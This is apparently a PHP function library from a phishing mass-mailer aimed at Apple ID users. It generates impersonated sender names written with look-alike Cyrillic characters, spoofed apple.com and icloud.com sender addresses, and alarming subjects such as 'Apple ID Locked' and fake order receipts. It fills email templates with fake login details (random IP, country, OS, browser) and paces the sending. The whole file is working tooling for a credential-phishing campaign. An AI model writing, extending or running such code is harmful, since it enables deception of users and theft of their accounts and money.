<?php  
date_default_timezone_set('Asia/Tokyo');

function RandString($randstr){ $char = 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890'; 
$str = ''; 
for ($i = 0; 
$i < $randstr; 
$i++ ) { $pos = rand(0, strlen($char)-1); 
$str .= $char{$pos}; 
} 
return $str; 

	} 
function RandString1($randstr){ $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
$str = ''; 
for ($i = 0; 
$i < $randstr; 
$i++ ) { $pos = rand(0, strlen($char)-1); 
$str .= $char{$pos}; 
} 
return $str; 
}
function RandString2($randstr){ $char = '0123456789abcdefghijklmnopqrstuvwxyz'; 
$str = ''; 
for ($i = 0; 
$i < $randstr; 
$i++ ) { $pos = rand(0, strlen($char)-1); 
$str .= $char{$pos}; 
} 
return $str; 
}
function RandNumber ($randstr){ $char = '0123456789'; 
$str = ''; 
for ($i = 0; 
$i < $randstr; 
$i++ ) { $pos = rand(0, strlen($char)-1); 
$str .= $char{$pos}; 
} return $str; 

	 
} function randName($rand){ switch ($rand) { 
case '1': $name = 'Sесuге Aррlе'; 
break; 
case'2': $name = 'ѕесuге@аррlе.соm'; 
break; 
case'3': $name = 'Aррlе Support'; 
break; 
case'4': $name = 'Aррlе ID'; 
break; 
case'5': $name = 'Aррlе Recovery'; 
break; 
case'6': $name = 'Aррlе Notice'; 
break; 
case'7': $name = 'iCloud'; 
break; 
case'8': $name = 'iMessage'; 
break; 
case'9': $name = 'Aррlе Apps';
break;
default: $name = 'Aррlе Security'; 
break; 
} return $name; 
} function randMail($rand){ switch ($rand) { 
case '1': $name = "".RandString1(10)."noreply-".RandString1(8)."@icloud.me"; 
break; 
case'2': $name = "".RandString1(10)."noreply-".RandString1(8)."@m.apple.me"; 
break; 
case'3': $name = "".RandString1(10)."noreply-".RandString1(8)."@services.apple.com"; 
break; 
case'4': $name = "".RandString1(10)."noreply-".RandString1(8)."@reminder.icloud.com"; 
break; 
case'5': $name = "".RandString1(10)."noreply-".RandString1(8)."@imessage.apple.com"; 
break; 
case'6': $name = "".RandString1(10)."noreply-".RandString1(8)."@imessage.icloud.com"; 
break; 
case'7': $name = "".RandString1(10)."noreply-".RandString1(8)."@notifications.apple.com"; 
break; 
default: $name = "".RandString1(10)."noreply-".RandString1(8)."@notifications.icloud.com"; 
break; 
} return $name; 
} function randSubject($rand){ $r = rand(1000,9999); 
switch ($rand) { case '1': $name = "Reminder : Login Autorized Apple ID"; 
break; 
case'2': $name = "Apple ID Login Activation ".RandString(8).""; 
break; 
case'3': $name = "Notice : Security Alert From Your Apple ID "; 
break; 
case'4': $name = "Reminder : Apple ID Token ".RandString(8).""; 
break; 
case'5': $name = "Apple ID Notification #" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). ""; 
break; 
case'6': $name = "Apple ID Security Notice #" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). ""; 
break; 
case'7': $name = "Apple ID Locked #" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). ""; 
break; 
case'8': $name = "Your Apple ID Has Be Disabled Notice #" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). ""; 
break; 
case'9': $name = "Your Apple ID Recicpt Order #" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). " Please Check Your Order."; 
break; 
default: $name = "Apple ID Disable Temporary Account #".RandString(8).""; 
break; 
} return $name; 
} function lettering($msgfile,$email,$frommail,$fromname,$randurl,$subject){ $randip = "" .rand(1,100). "." .rand(1,100). "." .rand(1,100). "." .rand(1,100). ""; 
$randstr1 = RandString(10); 
$randnumber1 = RandNumber(5);
$randnumber2 = RandNumber(5);
$randnumber3 = RandNumber(5);
$randnumber4 = RandNumber(5);
$randnumber5 = RandNumber(5);
$randnumber6 = RandNumber(5);
$randnumber7 = RandNumber(5);
$randnumber8 = RandNumber(5);
$randnumber9 = RandNumber(5);
$randnumber10 = RandNumber(5);
shuffle($randurl); 

$randurls = array_shift($randurl); 
$countries = array("Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe"); 
shuffle($countries); 
$country = array_shift($countries); 

$OSystems = array("Windows NT","Windows 7","Windows 8.1","Linux","Ubuntu","iPhone 5","iPhone 6","iPhone 7","Mac");
shuffle($OSystems); 
$OS = array_shift($OSystems); 

$ListBrowser = array("Opera Mini","Chrome","FireFox","Safari");
shuffle($ListBrowser); 
$browser = array_shift($ListBrowser); 

$date = date('G:i, d M Y'); 
$file = file_get_contents($msgfile); 
$arr = array('##email##','##subject##','##randomip##','##frommail##','##fromname##','##short##','##randstring##','##country##','##date##','##number1##','##number2##','##number3##','##number4##','##number5##','##number6##','##number7##','##number8##','##number9##','##number10##','##OS##','##browser##'); 
$new = array(''.$email.'',''.$subject.'',''.$randip.'',''.$frommail.'',''.$fromname.'',''.$randurls.'',''.$randstr1.'',''.$country.'',''.$date.'',''.$randnumber1.'',''.$randnumber2.'',''.$randnumber3.'',''.$randnumber4.'',''.$randnumber5.'',''.$randnumber6.'',''.$randnumber7.'',''.$randnumber8.'',''.$randnumber9.'',''.$randnumber10.'',''.$OS.'',''.$browser.''); 
$repl = str_replace($arr, $new, $file); 
return $repl; 
} function Reletter($letter,$mailto){ $file = file_get_contents($letter); 
$arr = array('##email##'); 
$new = array(''.$mailto.''); 
$repl = str_replace($arr, $new, $file); 
return $repl; 
} function berhenti($kata){ $k = strlen($kata); 
if($k==$k){ $p = substr($kata,$k-1); 
if($p==0){ echo"Break for 4 seconds...\n"; 
sleep(4); 
} } } function Savedata($file,$data){ $file = fopen($file,"w"); 
fputs($file,PHP_EOL.$data); 
return fclose($file); 
} function RemoveLine($file,$name){ $getfile = file_get_contents($file); 
$search = explode($name,$getfile); 
$save = $search[1]; 
$savedata = Savedata($file,$save); 
return $savedata; 
} ?>